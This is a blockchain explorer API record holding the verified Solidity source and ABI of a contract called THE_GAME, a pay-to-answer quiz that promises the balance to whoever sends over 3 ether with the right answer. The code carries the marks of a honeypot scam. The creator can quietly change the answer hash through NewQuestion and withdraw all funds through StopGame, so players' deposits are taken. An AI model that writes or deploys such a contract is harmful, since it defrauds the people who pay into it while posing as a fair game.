{"status": "1", "message": "OK", "result": [{"SourceCode": "pragma solidity ^0.4.25;\r\n\r\ncontract THE_GAME\r\n{\r\n    function Try(string _response) external payable {\r\n        require(msg.sender == tx.origin);\r\n        \r\n        if(responseHash == keccak256(_response) && msg.value > 3 ether)\r\n        {\r\n            msg.sender.transfer(this.balance);\r\n        }\r\n    }\r\n    \r\n    string public question;\r\n    \r\n    address questionSender;\r\n    \r\n    bytes32 responseHash;\r\n \r\n    bytes32 questionerPin = 0x07463f5f7865cce94da60d3e130861a694f3f274f042d9592af76954f9285b54;\r\n \r\n    function ActivateContract(bytes32 _questionerPin, string _question, string _response) public payable {\r\n        if(keccak256(_questionerPin)==questionerPin) \r\n        {\r\n            responseHash = keccak256(_response);\r\n            question = _question;\r\n            questionSender = msg.sender;\r\n            questionerPin = 0x0;\r\n        }\r\n    }\r\n    \r\n    function StopGame() public payable {\r\n        require(msg.sender==questionSender);\r\n        msg.sender.transfer(this.balance);\r\n    }\r\n    \r\n    function NewQuestion(string _question, bytes32 _responseHash) public payable {\r\n        if(msg.sender==questionSender){\r\n            question = _question;\r\n            responseHash = _responseHash;\r\n        }\r\n    }\r\n    \r\n    function newQuestioner(address newAddress) public {\r\n        if(msg.sender==questionSender)questionSender = newAddress;\r\n    }\r\n    \r\n    \r\n    function() public payable{}\r\n}", "ABI": "[{\"constant\":false,\"inputs\":[{\"name\":\"_response\",\"type\":\"string\"}],\"name\":\"Try\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_question\",\"type\":\"string\"},{\"name\":\"_responseHash\",\"type\":\"bytes32\"}],\"name\":\"NewQuestion\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"question\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"newAddress\",\"type\":\"address\"}],\"name\":\"newQuestioner\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_questionerPin\",\"type\":\"bytes32\"},{\"name\":\"_question\",\"type\":\"string\"},{\"name\":\"_response\",\"type\":\"string\"}],\"name\":\"ActivateContract\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"StopGame\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}]", "ContractName": "THE_GAME", "CompilerVersion": "v0.4.25+commit.59dbf8f1", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "", "Proxy": "0", "Implementation": "", "SwarmSource": "bzzr://552b74576aa0865b5d07ea2d190e4713d9def563f344eebe519553e7c892c716"}]}